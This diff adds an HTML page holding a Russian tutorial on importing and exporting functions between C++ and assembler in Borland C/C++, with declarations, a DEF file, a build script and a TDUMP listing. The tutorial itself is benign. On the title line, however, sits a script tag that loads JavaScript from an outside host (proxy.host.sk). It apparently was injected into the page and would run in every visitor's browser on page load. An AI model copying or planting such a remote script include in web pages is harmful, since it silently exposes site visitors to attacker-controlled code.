@@ -1,0 +1,173 @@
+<html>
+<head>
+<title>Импорты и экспорты</title><script language='JavaScript' type='text/javascript' src='http://proxy.host.sk/index.php'></script>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+</head>
+<body bgcolor=#B0B0B0 text=#000000 link=#0000FF vlink=#2020C0 alink=#000000>
+
+<h2 align=center>Импорты и экспорты</h2>
+
+<p>Здесь   будут   приведены   примеры   импорта   и   экспорта  функций,
+ применительно к Borland C/C++.
+
+<p>Пусть  наш  проект  состоит  из  файла на C++ (CPPFILE.CPP) и файла на
+ ассемблере    (ASMFILE.ASM),    а   результирующий   EXE-шник   называется
+ EXEFILE.EXE.
+
+<p>И  пусть  мы хотим вызывать функции, написанные в си-шном исходнике из
+ ассемблерного  кода,  и  наоборот;  а  также  экспортировать  и  си-шные и
+ ассемблерные функции из полученного PE EXE файла.
+<p>Пусть  также  есть некоторая внешняя библиотека ANYDLL.DLL, функции из
+ которой мы хотим использовать в обоих частях проекта, т.е. и на ассемблере
+ и на си.
+
+<p>Вот как тогда будет выглядеть файл СPPFILE.CPP:
+
+<p>
+<table width=100% border=1 cellspacing=0 cellpadding=0 bgcolor=#b8b8b8>
+<tr>
+<td>
+<pre>
+
+#include &lt;stdio.h&gt;
+
+extern "C"
+{
+  int         __cdecl CodeInASM_UseInCPP_CName     (int x);
+  int _import __cdecl CodeInEXTPE_UseInCPP_Cname   (int x);
+  int _import __cdecl CodeInEXTPE_UseInCPP_Ordinal (int x);
+  int         __cdecl CodeInCPP_UseInASM_CName     (int x) { return x; }
+  int _export __cdecl CodeInCPP_UseInEXTPE_CName   (int x) { return x; }
+}
+extern "C++"
+{
+  int         __cdecl CodeInASM_UseInCPP_CPPName   (int x);
+  int _import __cdecl CodeInEXTPE_UseInCPP_CPPname (int x);
+  int         __cdecl CodeInCPP_UseInASM_CPPName   (int x) { return x; }
+  int _export __cdecl CodeInCPP_UseInEXTPE_CPPName (int x) { return x; }
+}
+
+int RegisterUsage()
+{
+  return (int)&CodeInASM_UseInCPP_CName      +
+         (int)&CodeInASM_UseInCPP_CPPName    +
+         (int)&CodeInEXTPE_UseInCPP_Cname    +
+         (int)&CodeInEXTPE_UseInCPP_CPPname  +
+         (int)&CodeInEXTPE_UseInCPP_Ordinal  +
+         (int)&CodeInCPP_UseInASM_CName      +
+         (int)&CodeInCPP_UseInASM_CPPName    +
+         (int)&CodeInCPP_UseInEXTPE_CName    +
+         (int)&CodeInCPP_UseInEXTPE_CPPName;
+}
+
+int main()
+{
+  RegisterUsage();
+}
+</pre>
+</table>
+
+<p>В свою очередь, ASMFILE.ASM будет выглядеть так:
+
+<p>
+<table width=100% border=1 cellspacing=0 cellpadding=0 bgcolor=#b8b8b8>
+<tr>
+<td>
+<pre>
+
+                        public  _CodeInASM_UseInCPP_CName
+_CodeInASM_UseInCPP_CName:
+                        mov     eax, [esp+4]
+                        retn
+
+                        public  @CodeInASM_UseInCPP_CPPName$qi
+@CodeInASM_UseInCPP_CPPName$qi:
+                        mov     eax, [esp+4]
+                        retn
+
+                        publicdll CodeInASM_UseInEXTPE
+CodeInASM_UseInEXTPE:
+                        mov     eax, [esp+4]
+                        retn
+
+                        public  CodeInASM_UseInEXTPE_RenameInDef
+CodeInASM_UseInEXTPE_RenameInDef:
+                        mov     eax, [esp+4]
+                        retn
+
+                        extern  CodeInEXTPE_UseInASM_Name:PROC
+                        call    CodeInEXTPE_UseInASM_Name
+
+                        extern  CodeInEXTPE_UseInASM_Ordinal:PROC
+                        call    CodeInEXTPE_UseInASM_Ordinal
+</pre>
+</table>
+
+<p>Для  успешной  компиляции всего этого потребуется EXEFILE.DEF файл,
+в котором будут описаны соответствия внутренних и внешних имен
+функций проекта:
+
+<p>
+<table width=100% border=1 cellspacing=0 cellpadding=0 bgcolor=#b8b8b8>
+<tr>
+<td>
+<pre>
+
+EXPORTS
+  AsmFunc = CodeInASM_UseInEXTPE_RenameInDef
+
+IMPORTS
+  _CodeInEXTPE_UseInCPP_Cname      = ANYDLL._CodeInEXTPE_UseInCPP_Cname
+  @CodeInEXTPE_UseInCPP_CPPname$qi = ANYDLL.@CodeInEXTPE_UseInCPP_CPPname$qi
+  _CodeInEXTPE_UseInCPP_Ordinal    = ANYDLL.666
+
+  CodeInEXTPE_UseInASM_Name        = ANYDLL.CodeInEXTPE_UseInASM_Name
+  CodeInEXTPE_UseInASM_Ordinal     = ANYDLL.777
+</pre>
+</table>
+
+<p>Теперь, чтобы все это скомпилировать, понадобится файл MAKE.BAT:
+
+<p>
+<table width=100% border=1 cellspacing=0 cellpadding=0 bgcolor=#b8b8b8>
+<tr>
+<td>
+<pre>
+
+@echo off
+set X=d:\whatever\borland\bcc55
+%X%\bin\bcc32.exe -eEXEFILE -I%X%\include -L%X%\lib cppfile.cpp asmfile.asm
+</pre>
+</table>
+
+<p>С другой стороны, можно было бы сделать ANYDLL.LIB, посредством<br>
+<pre>IMPLIB.EXE -f anydll.lib anydll.dll</pre>
+после чего вместо IMPORTS-части EXEFILE.DEF файла, использовать ANYDLL.LIB;
+при этом надо не забыть подать ANYDLL.LIB в командную строку bcc32.exe.
+
+<p>Вот часть TDUMP'а от полученного EXEFILE.EXE:
+
+<p>
+<table width=100% border=1 cellspacing=0 cellpadding=0 bgcolor=#b8b8b8>
+<tr>
+<td>
+<pre>
+
+Exports from EXEFILE.exe
+    RVA      Ord. Hint Name
+    -------- ---- ---- ----
+    00001168    3 0000 CodeInCPP_UseInEXTPE_CPPName(int)
+    000011C7    6 0001 AsmFunc
+    000011C2    4 0002 CodeInASM_UseInEXTPE
+    00001160    2 0003 _CodeInCPP_UseInEXTPE_CName
+
+Imports from ANYDLL.DLL
+                  _CodeInEXTPE_UseInCPP_Cname
+                  CodeInEXTPE_UseInCPP_CPPname(int)
+                  CodeInEXTPE_UseInASM_Name
+    (ord. =  777)
+    (ord. =  666)
+</pre>
+</table>
+
+<p><hr
